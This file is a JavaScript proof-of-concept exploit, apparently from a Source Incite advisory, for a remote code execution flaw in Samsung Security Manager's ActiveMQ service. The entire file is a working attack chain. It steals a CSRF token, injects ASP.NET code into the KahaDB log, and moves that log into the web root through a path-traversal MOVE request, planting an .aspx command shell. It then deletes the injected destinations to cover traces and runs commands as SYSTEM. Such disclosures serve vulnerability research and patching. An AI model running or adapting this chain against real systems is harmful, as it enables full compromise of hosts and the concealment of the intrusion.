/*

Samsung Security Manager ActiveMQ Service MOVE Method Remote Code Execution Vulnerability
SRC: SRC-2016-0031
Found by: Steven Seeley of Source Incite
Thanks to: Shreevatsa for the clever JS tricks

*/

function inject_kahadb_log() {
  if (this.readyState == 4) {
    var res = this.responseText.match(/secret" value="(.*)"/g);
    var csrf = res.toString().split("=\"")[1];
    csrf = csrf.substring(0, csrf.length - 1);		
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:8161/admin/createDestination.action", false);
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    xhr.send("JMSDestinationType=topic&secret=" + csrf + "&JMSDestination=%3c%25%3dSystem.Diagnostics.Process.Start(request(\"c\"),request(\"a\"))%25%3e");
  }
}

function bye_bye_xss(uri){
  var xhr = new XMLHttpRequest();
  xhr.open('GET', uri.replace(/\+/g,"%2b"), true);
  xhr.send();
}

function clean_up(){
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
      var els = xhr.responseXML.getElementsByTagName("a");
      for (var i = 0, l = els.length; i < l; i++) {
        var el = els[i];
        if (el.href.search("http://localhost:8161/admin/deleteDestination.action") == 0) {
          bye_bye_xss(el.href);
        }
      }
    }
  }
  xhr.open('GET', 'http://localhost:8161/admin/queues.jsp', true);
  xhr.responseType = "document"; // so that we can parse the reponse as a document
  xhr.send(null);
}

function get_csrf_for_kahadb_log_injection() {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = inject_kahadb_log;
  xhr.open("GET", "http://localhost:8161/admin/topics.jsp", true);
  xhr.withCredentials = true;
  xhr.send(null);
  return true;
}

function move_log_to_aspx() {
  var uri = "http://localhost:8161/fileserver/%5c..%2f%2f..%5c%5cdata%2f%2fkahadb%2f%2fdb.data";
  var xhr = new XMLHttpRequest();
  xhr.open("MOVE", uri, true);
  xhr.setRequestHeader("Destination","http://localhost:8161/C://Program Files//Samsung//SSM//MediaGateway//WebViewer//move.aspx");
  xhr.send();
  return true;
}

function pop_calc(){
  var xhr = new XMLHttpRequest();
  xhr.open('GET', "http://localhost:4512/move.aspx?c=c:/Windows/System32/cmd.exe&a=/c+calc.exe", true);
  xhr.send();
}

function start() {
  get_csrf_for_kahadb_log_injection(); // injects C# ASP.NET code into the log file 
  setTimeout(move_log_to_aspx, 4000);  // creates an aspx file with command execution
  clean_up();                          // cleans the xss
  setTimeout(pop_calc, 4000);          // well, time to execute a SYSTEM calc
}

start();
